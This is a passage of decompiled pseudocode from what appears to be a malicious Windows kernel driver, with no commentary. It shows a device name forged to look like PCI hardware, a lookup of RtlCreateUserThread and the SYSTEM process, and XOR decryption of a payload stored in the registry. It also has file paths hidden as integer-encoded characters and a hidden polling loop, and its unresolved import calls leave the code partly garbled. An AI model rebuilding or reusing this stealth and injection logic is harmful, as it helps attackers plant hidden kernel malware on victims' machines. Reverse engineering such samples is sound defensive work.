      v16 = MEMORY[0x80F02E0113215](v12, a2, &a10, *((_QWORD *)v15 + 10));
      v12 = (unsigned int)v16;
      if ( v16 < 0 )
        goto LABEL_21;
      a2 = MEMORY[0x9741506001603]((unsigned int)v16, a2, v17, a10);
      v18 = MEMORY[0xA150200006204](v12, a2, v31, a2);
      v12 = (unsigned int)v18;
      if ( v18 < 0 )
        goto LABEL_13;
      v20 = sub_7502((unsigned int)v18, a2, 1LL, v31, &v29);
      v12 = (unsigned int)v20;
      if ( v20 < 0 )
        goto LABEL_15;
      MEMORY[0x5002300360047005]((unsigned int)v20, a2, L"SYSTEM", v34);
      a8 = 0;
      a9 = 0;
      v22 = MEMORY[0x60B02700B520F](v12, a2, &a7, *(_QWORD *)(v29 + 48), v32, &a9);
      v12 = v22;
      if ( (v22 & 0x80000000) != 0 )
        break;
      LOBYTE(v24) = 1;
      if ( !(unsigned int)MEMORY[0x2A0000077C4](v22, a2, v34, v32, v24) )
      {
        nullsub_1();
        v25 = sub_1188(v12, a2, a10, a4);
        v12 = v25;
        if ( (int)(v25 + 0x80000000) < 0 || v25 == -1073741515 )
        {
          sub_756D(v25, a2, 0x80000000LL, v29);
          MEMORY[0x6341500086415](v12, a2, v26, a2);
          MEMORY[0x60000077C4](v12, a2, v27, a10);
LABEL_24:
          v15 = v28;
LABEL_25:
          if ( v15 )
            sub_3B98(v12, a2);
          MEMORY[0x13640F06530602](v12, a2, 1279479873LL, v14);
          return (unsigned int)v12;
        }
      }
LABEL_21:
      v15 = (unsigned int *)((char *)v15 + *v15);
      if ( !*v15 )
        goto LABEL_24;
    }
    sub_756D(v22, a2, v23, v29);
LABEL_15:
    MEMORY[0x6341500086415](v12, a2, v21, a2);
LABEL_13:
    MEMORY[0x60000077C4](v12, a2, v19, a10);
    goto LABEL_21;
  }
  return result;
}


// Function: sub_1728 at 0x1728
__int64 __fastcall sub_1728(_DWORD a1, __int64 a2, _DWORD a3, __int64 a4)
{
  signed int v5; // ebx
  __int64 v6; // rdx
  __int64 (__fastcall *v7)(__int64, __int64, _QWORD, __int64, _QWORD, _QWORD); // r10
  int v8; // eax
  int v9; // edx
  int v10; // r8d
  int v11; // r9d
  signed int v12; // eax
  __int64 v13; // rdx
  _BYTE v15[16]; // [rsp+50h] [rbp-10h] BYREF

  v5 = -1073741823;
  MEMORY[0x5002300360047005](a4, a2, L"RtlCreateUserThread", v15);
  v7 = (__int64 (__fastcall *)(__int64, __int64, _QWORD, __int64, _QWORD, _QWORD))MEMORY[0xA5641E00A6741E](
                                                                                    a4,
                                                                                    a2,
                                                                                    v6,
                                                                                    v15);
  if ( v7 )
  {
    v5 = v7(a4, a2, 0LL, -1LL, 0LL, 0LL);
    nullsub_1();
    if ( v5 >= 0 )
    {
      v5 = MEMORY[0x6DE42206001602](a4, a2, 0x1FFFFFLL, 0LL, MEMORY[0x680122006A3422], 0LL);
      if ( v5 >= 0 )
      {
        v5 = MEMORY[0xA2011E00A4341E](a4, a2, 0LL, 0LL, 0LL, 0LL);
        if ( v5 >= 0 )
        {
          v8 = MEMORY[0x8120200004204]();
          if ( (unsigned __int8)sub_3B6C(a4, a2, v9, v8, v10, v11) )
            v5 = -1073741558;
          v12 = v5;
          v5 = 0;
          if ( *(_DWORD *)(a4 + 8) != 1216605224 )
            v5 = v12;
          if ( v5 >= 0 )
            v5 = *(_DWORD *)(a4 + 12) == 0 ? 0xC0000135 : 0;
        }
        nullsub_1();
        nullsub_1();
        MEMORY[0x60000077C4](a4, a2, v13, 0LL);
      }
    }
  }
  return (unsigned int)v5;
}


// Function: sub_1898 at 0x1898
__int64 __fastcall sub_1898(__int64 a1, __int64 a2, __int64 a3, int a4, __int64 *a5, _DWORD *a6)
{
  unsigned int *v9; // rsi
  __int64 v11; // rdi
  int v12; // ebx
  int v13; // eax
  __int64 v14; // rax
  __int64 v15; // r14
  __int64 v16; // rax
  _BYTE *v17; // r9
  __int64 v18; // rbx
  unsigned int v19; // r8d
  char v20; // dl
  unsigned int v22; // [rsp+30h] [rbp-D0h]
  unsigned int v23; // [rsp+34h] [rbp-CCh] BYREF
  __int64 v24; // [rsp+38h] [rbp-C8h] BYREF
  _BYTE v25[16]; // [rsp+40h] [rbp-C0h] BYREF
  _BYTE v26[16]; // [rsp+50h] [rbp-B0h] BYREF
  int v27; // [rsp+60h] [rbp-A0h] BYREF
  __int64 v28; // [rsp+68h] [rbp-98h]
  _BYTE *v29; // [rsp+70h] [rbp-90h]
  int v30; // [rsp+78h] [rbp-88h]
  __int128 v31; // [rsp+80h] [rbp-80h]
  _BYTE v32[528]; // [rsp+90h] [rbp-70h] BYREF

  v9 = 0LL;
  v24 = 0LL;
  v11 = 0LL;
  sub_7AF0(0LL, 0LL, 0LL, v32, 520LL);
  sub_1BA0(0, 0, 260, (unsigned int)v32, (unsigned int)L"%wZ\\Parameters", a4);
  MEMORY[0x5002300360047005](0LL, 0LL, v32, v26);
  v28 = 0LL;
  v29 = v26;
  v27 = 48;
  v30 = 576;
  v31 = 0LL;
  v12 = MEMORY[0x77C400005014](0LL, 0LL, 983103LL, &v24, &v27);
  if ( v12 >= 0 )
  {
    MEMORY[0x5002300360047005](0LL, 0LL, a3, v25);
    v13 = MEMORY[0x1040200000330](0LL, 0LL, v25, v24, 2LL, 0LL);
    v12 = v13;
    if ( v13 == -2147483643 || v13 == -1073741789 )
    {
      if ( v22 < 0x10 )
      {
        v12 = -1073741820;
        goto LABEL_25;
      }
      v11 = MEMORY[0x81E1A50023003](0LL, 0LL, v22, 0LL, 1734766147LL);
      if ( !v11 )
        goto LABEL_7;
      v12 = MEMORY[0x1040200000330](v11, 0LL, v25, v24, 2LL, v11);
      if ( v12 >= 0 )
      {
        if ( *(_DWORD *)(v11 + 4) == 3 && *(_DWORD *)(v11 + 8) )
        {
          v23 = 512;
          v14 = MEMORY[0x81E1A50023003](v11, 0LL, 512LL, 0LL, 1734766147LL);
          v9 = (unsigned int *)v14;
          if ( !v14 )
            goto LABEL_7;
          if ( (unsigned int)sub_7308(v11, v14, &v23, v14, v11 + 12, v23) || v23 < 0x14 )
          {
            v12 = -1073741823;
            goto LABEL_25;
          }
          v15 = *v9;
          if ( (_DWORD)v15 != *(_DWORD *)(v11 + 8) - 512 )
          {
            v12 = -1073741575;
            goto LABEL_25;
          }
          v16 = MEMORY[0x81E1A50023003](v11, v9, *v9, 0LL, 1734766147LL);
          v18 = v16;
          if ( !v16 )
          {
LABEL_7:
            v12 = -1073741801;
            goto LABEL_25;
          }
          v19 = 0;
          if ( (_DWORD)v15 )
          {
            v17 = (_BYTE *)v16;
            do
            {
              v20 = v19 + v19 / 0xFF;
              ++v19;
              *v17 = v17[v11 + 524 - v16] ^ *((_BYTE *)v9 + (((unsigned __int8)v17 - (unsigned __int8)v16) & 0xF) + 4) ^ v20;
              ++v17;
            }
            while ( v19 < (unsigned int)v15 );
          }
          if ( (unsigned int)sub_42E8(v11, v9, v15, v16, v9 + 1, v17) )
          {
            MEMORY[0x13640F06530602](v11, v9, 1734766147LL, v18);
            *a5 = 0LL;
            v12 = -1073741576;
            *a6 = 0;
          }
          else
          {
            *a5 = v18;
            v12 = 0;
            *a6 = v15;
          }
        }
        else
        {
          v12 = -1073741788;
        }
      }
    }
  }
LABEL_25:
  if ( v24 )
    MEMORY[0x6B6422006C7422]();
  if ( v9 )
    MEMORY[0x13640F06530602](v11, v9, 1734766147LL, v9);
  if ( v11 )
    MEMORY[0x13640F06530602](v11, v9, 1734766147LL, v11);
  return (unsigned int)v12;
}


// Function: sub_1B84 at 0x1B84
__int64 __fastcall sub_1B84(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 result; // rax

  if ( a4 )
    return MEMORY[0x13640F06530602](a1, a2, 1734766147LL);
  return result;
}


// Function: sub_1BA0 at 0x1BA0
__int64 __fastcall sub_1BA0(
        _DWORD a1,
        _DWORD a2,
        __int64 a3,
        _WORD *a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10)
{
  unsigned int v11; // edi
  unsigned __int64 v12; // rsi
  int v13; // eax

  a10 = a6;
  if ( (unsigned __int64)(a3 - 1) <= 0x7FFFFFFE )
  {
    v12 = a3 - 1;
    v11 = 0;
    v13 = sub_7600(0LL, a3 - 1, a3 - 1, a4, a5, &a10);
    if ( v13 < 0 || v13 > v12 )
    {
      v11 = -2147483643;
    }
    else if ( v13 != v12 )
    {
      return v11;
    }
    a4[v12] = 0;
    return v11;
  }
  v11 = -1073741811;
  if ( a3 )
    *a4 = 0;
  return v11;
}


// Function: sub_1C0C at 0x1C0C
__int64 __fastcall sub_1C0C(int a1, int a2, unsigned __int16 a3, int *a4, int a5, int a6)
{
  int v6; // eax
  _WORD v8[4]; // [rsp+20h] [rbp-18h] BYREF
  int *v9; // [rsp+28h] [rbp-10h]

  if ( a3 >= 0x808u )
  {
    v9 = a4 + 1;
    v8[1] = 1024;
    v8[0] = *((_WORD *)a4 + 1026);
    v6 = *a4;
    if ( *a4 == 10000 )
      return sub_2E0C(a1, a2, a5, (unsigned int)v8, a5, a6);
    switch ( v6 )
    {
      case 20000:
        return sub_2EB8(a1, a2, a5, (unsigned int)v8, a5, a6);
      case 30000:
        return sub_5F44(a1, a2, a5, (unsigned int)v8, a5, a6);
      case 40000:
        return sub_5F4C(a1, a2, a5, (unsigned int)v8, a5, a6);
    }
  }
  return 3221225485LL;
}


// Function: sub_1CA0 at 0x1CA0
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_1CA0(__int64 a1, __int64 a2, __int64 a3, _QWORD *a4)
{
  __int64 result; // rax
  int v6; // eax
  __int64 v7; // rdx
  unsigned int v8; // edi
  int v9; // [rsp+40h] [rbp-20h] BYREF
  const __int16 *v10; // [rsp+48h] [rbp-18h]
  int v11; // [rsp+50h] [rbp-10h] BYREF
  const __int16 *v12; // [rsp+58h] [rbp-8h]

  v10 = L"\\Device\\PCI#VEN_80586&DEV_1KEA2TDPX";
  v9 = 4718662;
  v12 = L"\\DosDevices\\PCI#VEN_80586&DEV_1KEA2TDPX";
  v11 = 5242958;
  result = MEMORY[0x80F027006720A](a1, a2, 0LL, a4, &v9, 34LL);
  if ( (int)result >= 0 )
  {
    v6 = MEMORY[0x7640F06001602](a1, a2, &v9, &v11);
    v8 = v6;
    if ( v6 >= 0 )
    {
      a4[14] = sub_1D84;
      a4[16] = sub_1D84;
      a4[32] = sub_1D84;
      a4[28] = sub_1DA4;
      qword_A018 = 0LL;
      byte_A010 = 1;
    }
    else
    {
      MEMORY[0x700B320F0006340F]((unsigned int)v6, a2, v7, 0LL);
    }
    return v8;
  }
  return result;
}


// Function: sub_1D84 at 0x1D84
__int64 __fastcall sub_1D84(__int64 a1, __int64 a2, __int64 a3)
{
  *(_DWORD *)(a3 + 48) = 0;
  *(_QWORD *)(a3 + 56) = 0LL;
  MEMORY[0xB340A06001602](a1, a2, 0LL, a3);
  return 0LL;
}


// Function: sub_1DA4 at 0x1DA4
__int64 __fastcall sub_1DA4(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        int a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10)
{
  _DWORD *v10; // rax
  __int64 v11; // rdi
  int *v12; // r14
  int v14; // ecx
  __int64 v15; // rdx
  int v16; // ecx
  int v17; // ecx
  unsigned int v18; // ebx
  int v19; // eax

  a9 = a2;
  a10 = a1;
  v10 = *(_DWORD **)(a3 + 184);
  v11 = 0LL;
  v12 = *(int **)(a3 + 24);
  v14 = v10[6];
  v15 = (unsigned int)v10[4];
  LODWORD(v10) = v10[2];
  HIDWORD(a8) = 0;
  if ( (unsigned int)v10 < 8 )
    goto LABEL_5;
  v16 = v14 - 2236456;
  if ( v16 )
  {
    v17 = v16 - 4;
    if ( v17 )
    {
      if ( v17 != 4 )
      {
LABEL_5:
        v18 = -1073741811;
        goto LABEL_11;
      }
      v19 = sub_1E58(0LL, a3, v15, v12);
    }
    else
    {
      v19 = sub_1E98(0LL, a3, v15, v12);
    }
  }
  else
  {
    v19 = sub_1C0C(0, a3, v15, v12, (int)&a8 + 4, a6);
  }
  v18 = v19;
  if ( v19 >= 0 )
  {
    LODWORD(a8) = v19;
    v11 = 8LL;
    *(_QWORD *)v12 = a8;
  }
LABEL_11:
  *(_QWORD *)(a3 + 56) = v11;
  *(_DWORD *)(a3 + 48) = v18;
  MEMORY[0xB340A06001602](v11, a3, 0LL, a3);
  return v18;
}


// Function: sub_1E58 at 0x1E58
__int64 __fastcall sub_1E58(int a1, int a2, __int16 a3, int *a4, int a5, int a6, __int64 a7, __int64 a8)
{
  int v8; // eax

  if ( a3 == 4 )
  {
    v8 = *a4;
    if ( *a4 == 10002 )
      return sub_2B84(a1, a2, a3, 50716, a5, a6, a7, a8);
    switch ( v8 )
    {
      case 20002:
        return sub_2B84(a1, a2, a3, 50694, a5, a6, a7, a8);
      case 30002:
        return sub_2B84(a1, a2, a3, 50104, a5, a6, a7, a8);
      case 40002:
        return sub_2B84(a1, a2, a3, 50124, a5, a6, a7, a8);
    }
  }
  return 3221225485LL;
}


// Function: sub_1E98 at 0x1E98
__int64 __fastcall sub_1E98(
        int a1,
        int a2,
        __int16 a3,
        int *a4,
        int a5,
        int a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10)
{
  int v10; // eax

  if ( a3 == 8 )
  {
    v10 = *a4;
    if ( *a4 == 10001 )
      return sub_2C0C(a1, a2, a4[1], 50716, a5, a6, a7, a8, a9, a10);
    switch ( v10 )
    {
      case 20001:
        return sub_2C0C(a1, a2, a4[1], 50694, a5, a6, a7, a8, a9, a10);
      case 30001:
        return sub_2C0C(a1, a2, a4[1], 50104, a5, a6, a7, a8, a9, a10);
      case 40001:
        return sub_2C0C(a1, a2, a4[1], 50124, a5, a6, a7, a8, a9, a10);
    }
  }
  return 3221225485LL;
}


// Function: sub_1EE4 at 0x1EE4
bool __fastcall sub_1EE4(__int64 a1)
{
  bool v1; // bl
  int v3; // [rsp+60h] [rbp-A0h] BYREF
  __int64 v4; // [rsp+68h] [rbp-98h] BYREF
  __int128 v5; // [rsp+70h] [rbp-90h] BYREF
  __int128 v6; // [rsp+80h] [rbp-80h] BYREF
  _DWORD v7[2]; // [rsp+90h] [rbp-70h] BYREF
  __int64 v8; // [rsp+98h] [rbp-68h]
  __int128 *v9; // [rsp+A0h] [rbp-60h]
  int v10; // [rsp+A8h] [rbp-58h]
  int v11; // [rsp+ACh] [rbp-54h]
  __int128 v12; // [rsp+B0h] [rbp-50h]
  _DWORD v13[14]; // [rsp+C0h] [rbp-40h] BYREF
  __int16 v14; // [rsp+F8h] [rbp-8h]
  _BYTE v15[512]; // [rsp+100h] [rbp+0h] BYREF
  _BYTE v16[512]; // [rsp+300h] [rbp+200h] BYREF

  v13[0] = 4128860;
  v7[1] = 0;
  v11 = 0;
  v4 = 0LL;
  v14 = 0;
  v5 = 0LL;
  v1 = 0;
  v13[1] = 6029375;
  v6 = 0LL;
  v13[2] = 3801155;
  v13[3] = 5242972;
  v13[4] = 7274610;
  v13[5] = 7471207;
  v13[6] = 7143521;
  v13[7] = 6357060;
  v13[8] = 6357108;
  v13[9] = 6488156;
  v13[10] = 7012464;
  v13[11] = 6422645;
  v13[12] = 3211317;
  v13[13] = 3342387;
  MEMORY[0x5002300360047005](a1, 0LL, v13, &v6);
  v7[0] = 48;
  v8 = 0LL;
  v10 = 64;
  v9 = &v6;
  v12 = 0LL;
  if ( (int)MEMORY[0x6341900075419](a1, 0LL, 0x80000000LL, &v4, v7, &v5) >= 0 )
  {
    v5 = 0LL;
    sub_7AF0(512LL, 0LL, 0LL, v15, 512LL);
    if ( (int)MEMORY[0x80F02E0153219](512LL, 0LL, 0LL, v4, 0LL, 0LL) >= 0 && DWORD2(v5) == 512 )
    {
      sub_7AF0(512LL, 0LL, 0LL, v16, 512LL);
      v3 = 512;
      if ( !(unsigned int)sub_7308(512LL, 0LL, &v3, v16, v15, 512LL) )
      {
        if ( v3 )
          v1 = v16[0] == 1;
      }
    }
  }
  if ( v4 )
    MEMORY[0x6B6422006C7422]();
  return v1;
}


// Function: sub_20EC at 0x20EC
char __fastcall sub_20EC(__int64 a1)
{
  int v1; // eax
  __int64 v2; // rdx
  __int64 v3; // rdx
  _WORD *v4; // r8
  int v5; // r9d
  _BYTE *v6; // rcx
  int i; // edi
  _WORD *v8; // rbx
  __int64 v10; // [rsp+0h] [rbp-100h]
  int v11; // [rsp+8h] [rbp-F8h]
  __int64 v12; // [rsp+60h] [rbp-A0h] BYREF
  __int128 v13; // [rsp+70h] [rbp-90h] BYREF
  __int128 v14; // [rsp+80h] [rbp-80h] BYREF
  char v15; // [rsp+90h] [rbp-70h] BYREF
  __int128 v16; // [rsp+A0h] [rbp-60h] BYREF
  _DWORD v17[2]; // [rsp+B0h] [rbp-50h] BYREF
  __int64 v18; // [rsp+B8h] [rbp-48h]
  __int128 *v19; // [rsp+C0h] [rbp-40h]
  int v20; // [rsp+C8h] [rbp-38h]
  int v21; // [rsp+CCh] [rbp-34h]
  __int128 v22; // [rsp+D0h] [rbp-30h]
  _DWORD v23[20]; // [rsp+E0h] [rbp-20h] BYREF
  _BYTE v24[2]; // [rsp+130h] [rbp+30h] BYREF
  _WORD v25[255]; // [rsp+132h] [rbp+32h] BYREF

  v23[0] = 4128860;
  v17[1] = 0;
  v21 = 0;
  v12 = 0LL;
  v23[1] = 6029375;
  v23[2] = 3801155;
  v14 = 0LL;
  v23[3] = 5242972;
  v16 = 0LL;
  v23[4] = 7274610;
  v23[5] = 7471207;
  v23[6] = 7143521;
  v23[7] = 6357060;
  v23[8] = 6357108;
  v23[9] = 7536732;
  v23[10] = 7667786;
  v23[11] = 7471172;
  v23[12] = 3145776;
  v23[13] = 4915253;
  v23[14] = 3014765;
  v23[15] = 6357092;
  v23[16] = 116;
  MEMORY[0x5002300360047005](a1, 0LL, v23, &v16);
  v17[0] = 48;
  v18 = 0LL;
  v20 = 576;
  v19 = &v16;
  v22 = 0LL;
  v1 = MEMORY[0x6341900075419](a1, 0LL, 0x80000000LL, &v12, v17, &v14);
  if ( v1 >= 0 )
  {
    v14 = 0LL;
    sub_7AF0(a1, 0LL, 0LL, v24, 512LL);
    v1 = MEMORY[0x80F02E0153219](a1, 0LL, 0LL, v12, 0LL, 0LL);
    if ( v1 >= 0 )
    {
      if ( v12 )
        MEMORY[0x6B6422006C7422]();
      if ( (int)MEMORY[0x7640F06090602](a1, 0LL, v2, v17) < 0 )
      {
        v13 = v16;
        sub_3EC0(a1, 0, v3, (unsigned int)&v13, (_DWORD)v4, v5);
      }
      v1 = DWORD2(v14) - 2;
      if ( DWORD2(v14) != 2 )
      {
        v6 = v25;
        v3 = (unsigned int)v1;
        do
        {
          v4 = v25;
          LOBYTE(v1) = v24[(v6 - (_BYTE *)v25) & 1];
          *v6++ ^= v1;
          --v3;
        }
        while ( v3 );
      }
      for ( i = 0; (unsigned __int16)i < v25[0]; LOWORD(i) = i + 1 )
      {
        *(_QWORD *)&v13 = 0LL;
        v8 = &v25[17 * (unsigned __int16)i + 1];
        v1 = sub_41F0(i, 0, v3, (_DWORD)v8, (_DWORD)v4, v5, v10, v11);
        LODWORD(v3) = (unsigned __int16)v8[16];
        LOWORD(v3) = *((unsigned __int8 *)v8 + 33) | (unsigned __int16)((_WORD)v3 << 8);
        LODWORD(v13) = v1;
        WORD2(v13) = v3;
        if ( v1 || (_WORD)v3 )
          LOBYTE(v1) = sub_5064(i, 0, (unsigned int)&v15, (unsigned int)&v13, (_DWORD)v4, v5, v10);
      }
    }
  }
  return v1;
}


// Function: sub_2368 at 0x2368
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_2368(
        __int64 a1,
        __int64 a2,
        _WORD *a3,
        _QWORD *a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8)
{
  __int64 v8; // rbx
  __int64 v11; // r8
  __int64 v12; // r9
  int v13; // r8d
  int v14; // r9d
  int v15; // r8d
  int v16; // r9d
  int v17; // r8d
  int v18; // r9d
  int v19; // r8d
  int v20; // r9d
  __int64 v21; // rax
  __int64 v23; // rdx
  int v24; // [rsp+0h] [rbp-48h]
  __int64 v25; // [rsp+0h] [rbp-48h]
  __int64 v26; // [rsp+0h] [rbp-48h]
  __int64 v27; // [rsp+0h] [rbp-48h]
  int v28; // [rsp+0h] [rbp-48h]
  int v29; // [rsp+8h] [rbp-40h]
  __int64 v30; // [rsp+8h] [rbp-40h]
  __int64 v31; // [rsp+8h] [rbp-40h]
  int v32; // [rsp+8h] [rbp-40h]
  int v33; // [rsp+10h] [rbp-38h]
  __int64 v34; // [rsp+10h] [rbp-38h]
  char v35; // [rsp+10h] [rbp-38h]
  __int64 v36; // [rsp+10h] [rbp-38h]
  __int64 v37; // [rsp+18h] [rbp-30h]
  __int64 v38; // [rsp+18h] [rbp-30h]

  a8 = v8;
  sub_1CA0((__int64)a3, a2, (__int64)a3, a4);
  sub_1174();
  nullsub_1();
  sub_145C((__int64)a3, a2, (__int64)a3, (__int64)a4, v11, v12, v24, v29, v33, v37);
  sub_60D8((_DWORD)a3, a2, (_DWORD)a3, (_DWORD)a4, v13, v14, v25, v30, v34);
  sub_3604((_DWORD)a3, a2, (_DWORD)a3, (_DWORD)a4, v15, v16, v26);
  sub_5504((_DWORD)a3, a2, (_DWORD)a3, (_DWORD)a4, v17, v18, v27, v31, v35);
  sub_58EC((_DWORD)a3, a2, (_DWORD)a3, (_DWORD)a4, v19, v20, v28, v32, v36, v38);
  a4[13] = 0LL;
  qword_A020 = (__int64)a4;
  v21 = MEMORY[0x81E1A50023003](a3, a2, (unsigned __int16)a3[1] + 16LL, 0LL, 1852073032LL);
  qword_A028 = v21;
  if ( !v21 )
    return 3221225632LL;
  *(_QWORD *)(v21 + 8) = v21 + 16;
  MEMORY[0xE186058948C08B49] = *a3;
  MEMORY[0xE186058948C08B4B] = a3[1];
  MEMORY[0x60A0603000C1902](a3, a2, a3, 0xE186058948C08B49LL);
  MEMORY[0x77C400005010](a3, a2, 0LL, &a7, 0LL, -1LL);
  MEMORY[0x6B6422006C7422](a3, a2, v23, a7);
  nullsub_1();
  return 0LL;
}


// Function: sub_2484 at 0x2484
__int64 __fastcall sub_2484(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  int v6; // r8d
  int v7; // r9d
  int v9; // ebx
  int v10; // r8d
  int v11; // r9d
  int v12; // r8d
  int v13; // r9d
  __int16 v14; // [rsp+20h] [rbp-18h] BYREF
  unsigned __int16 v15; // [rsp+22h] [rbp-16h]
  __int64 v16; // [rsp+28h] [rbp-10h]

  v4 = *(_QWORD *)(a4 + 40);
  v14 = 0;
  v15 = *(_WORD *)(v4 + 72) + 512;
  v16 = MEMORY[0x8641900097419](a3, a2, v15, 1LL, 1852073032LL);
  if ( !v16 )
    return 3221225632LL;
  v9 = sub_3BC8(a3, a2, (unsigned int)&v14, (int)v4 + 72, v6, v7);
  if ( v9 >= 0 )
  {
    sub_2EB8(a3, a2, (unsigned int)&unk_A034, (unsigned int)&v14, v10, v11);
    MEMORY[0x13640F06530602](a3, a2, 1852073032LL, v16);
    return sub_5F44(a3, a2, (unsigned int)byte_A030, a3, v12, v13);
  }
  else
  {
    MEMORY[0x13640F06530602](a3, a2, 1852073032LL, v16);
    return (unsigned int)v9;
  }
}


// Function: sub_253C at 0x253C
// write access to const memory has been detected, the output may be wrong!
void __fastcall __noreturn sub_253C(__int64 a1, __int64 a2, int a3, __int64 a4, int a5, int a6)
{
  int v6; // edx
  int v7; // r8d
  int v8; // r9d

  sub_3BA4(a1, a2, a3, 2000, a5, a6);
  sub_2484(a1, a2, 0xE186058948C08B49LL, 0xA75C08548FFFFE1LL);
  while ( 1 )
  {
    sub_3BA4(a1, a2, v6, 1000, v7, v8);
    sub_20EC(a1);
    sub_1EE4(a1);
  }
}


// Function: sub_25CC at 0x25CC
__int64 __fastcall sub_25CC(int a1, int a2, int a3, int a4, int a5)
{
  return sub_25E8(a1, a2, a3, a4, 1, a5);
}


// Function: sub_25E8 at 0x25E8
__int64 __fastcall sub_25E8(
        _DWORD a1,
        __int64 a2,
        unsigned __int16 *a3,
        __int64 a4,
        unsigned int a5,
        _DWORD *a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        int a11)
{
  __int64 v12; // rdi
  __int64 v16; // rcx
  __int64 v17; // rbp
  __int64 v18; // rax
  __int64 v19; // rsi
  int v20; // r8d
  int v21; // r9d
  __int64 v22; // rdx
  __int64 v23; // r8
  _QWORD *i; // rdi
  __int64 v25; // rdx
  __int64 *v26; // rax
  _WORD v27[4]; // [rsp+20h] [rbp-38h] BYREF
  __int64 v28; // [rsp+28h] [rbp-30h]

  v12 = a5;
  if ( *(_DWORD *)(a4 + 80) != a5 )
    return 3221225851LL;
  v16 = *a3;
  if ( (unsigned __int16)(v16 - 1) > 0x3FEu )
    return 3221225506LL;
  v17 = *a3;
  v18 = MEMORY[0x81E1A50023003](a5, a2, v16 + 74, 0LL, 1281587301LL);
  v19 = v18;
  if ( !v18 )
    return 3221225506LL;
  sub_7AF0(v12, v18, 0LL, v18, v17 + 74);
  v27[0] = 0;
  v28 = v19 + 72;
  v27[1] = *a3;
  MEMORY[0x60A0603000C1902](v12, v19, a3, v27);
  if ( !(unsigned __int8)sub_2A50(v12, v19, (unsigned int)v27, (int)v19 + 24, v20, v21) )
  {
    MEMORY[0x13640F06530602](v12, v19, 1281587301LL, v19);
    return 3221225506LL;
  }
  if ( (unsigned int)(v12 - 2) <= 1 )
  {
    for ( i = *(_QWORD **)a4; i != (_QWORD *)a4; i = (_QWORD *)*i )
    {
      LOBYTE(v23) = 1;
      if ( (int)MEMORY[0x2A0000077C4](i, v19, i + 3, v19 + 24, v23) <= 0 )
        break;
    }
  }
  else
  {
    i = (_QWORD *)a4;
  }
  *(_DWORD *)(v19 + 20) = a11;
  MEMORY[0x6001606000E2202](i, v19, v22, a4 + 16);
  if ( *(_DWORD *)(v19 + 20) )
    ++*(_DWORD *)(a4 + 76);
  *(_DWORD *)(v19 + 16) = (*(_DWORD *)(a4 + 72))++;
  v26 = (__int64 *)i[1];
  if ( (_QWORD *)*v26 != i )
    __fastfail(3u);
  *(_QWORD *)v19 = i;
  *(_QWORD *)(v19 + 8) = v26;
  *v26 = v19;
  i[1] = v19;
  MEMORY[0xE641800036822](i, v19, v25, a4 + 16);
  *a6 = *(_DWORD *)(v19 + 16);
  return 0LL;
}


// Function: sub_275C at 0x275C
__int64 __fastcall sub_275C(int a1, __int64 a2, unsigned __int16 *a3, __int64 a4, _DWORD *a5, int a6)
{
  __int64 v7; // [rsp+0h] [rbp-38h]
  __int64 v8; // [rsp+8h] [rbp-30h]
  __int64 v9; // [rsp+10h] [rbp-28h]
  __int64 v10; // [rsp+18h] [rbp-20h]

  return sub_25E8(a1, a2, a3, a4, 0, a5, v7, v8, v9, v10, a6);
}


// Function: sub_2778 at 0x2778
__int64 __fastcall sub_2778(int a1, __int64 a2, unsigned __int16 *a3, __int64 a4, _DWORD *a5, int a6)
{
  __int64 v7; // [rsp+0h] [rbp-38h]
  __int64 v8; // [rsp+8h] [rbp-30h]
  __int64 v9; // [rsp+10h] [rbp-28h]
  __int64 v10; // [rsp+18h] [rbp-20h]

  return sub_25E8(a1, a2, a3, a4, 2u, a5, v7, v8, v9, v10, a6);
}


// Function: sub_2794 at 0x2794
__int64 __fastcall sub_2794(int a1, __int64 a2, unsigned __int16 *a3, __int64 a4, _DWORD *a5, int a6)
{
  __int64 v7; // [rsp+0h] [rbp-38h]
  __int64 v8; // [rsp+8h] [rbp-30h]
  __int64 v9; // [rsp+10h] [rbp-28h]
  __int64 v10; // [rsp+18h] [rbp-20h]

  return sub_25E8(a1, a2, a3, a4, 3u, a5, v7, v8, v9, v10, a6);
}


// Function: sub_27B0 at 0x27B0
char __fastcall sub_27B0(__int64 a1, __int64 a2, unsigned __int64 a3, _QWORD **a4, __int64 a5)
{
  __int64 v5; // rdi
  unsigned __int16 v8; // r9
  __int64 v9; // rdx
  __int64 v10; // r8
  _QWORD *i; // rbx
  __m128i v13; // [rsp+20h] [rbp-18h] BYREF

  v5 = 0LL;
  v8 = _mm_cvtsi128_si32(*(__m128i *)a3);
  v13 = *(__m128i *)a3;
  if ( v8 )
  {
    a3 = (unsigned __int64)v8 >> 1;
    if ( *(_WORD *)(v13.m128i_i64[1] + 2 * a3 - 2) == 92 )
      v13.m128i_i16[0] = v8 - 2;
  }
  MEMORY[0x6001606000E2202](0LL, a4, a3, a4 + 2);
  for ( i = *a4; i != a4; i = (_QWORD *)*i )
  {
    LOBYTE(v10) = 1;
    if ( !(unsigned int)MEMORY[0x2A0000077C4](0LL, a4, &v13, i + 5, v10) )
    {
      LOBYTE(v10) = 1;
      if ( !(unsigned int)MEMORY[0x2A0000077C4](0LL, a4, a5, i + 7, v10) )
      {
        LOBYTE(v5) = 1;
        break;
      }
    }
  }
  MEMORY[0xE641800036822](v5, a4, v9, a4 + 2);
  return v5;
}


// Function: sub_2874 at 0x2874
char __fastcall sub_2874(
        __int64 a1,
        double a2,
        double a3,
        double a4,
        double a5,
        double a6,
        double a7,
        __m128 a8,
        __int64 a9,
        __m128i *a10,
        __int64 **a11)
{
  __int64 v11; // r15
  __int64 v12; // rsi
  __m128i v14; // xmm6
  unsigned __int16 v15; // bx
  __int64 v16; // rdx
  __int64 v17; // r8
  __int64 *i; // rdi
  _OWORD v20[3]; // [rsp+20h] [rbp-38h] BYREF

  v11 = a10->m128i_i64[1];
  v12 = 0LL;
  v20[1] = a8;
  v14 = *a10;
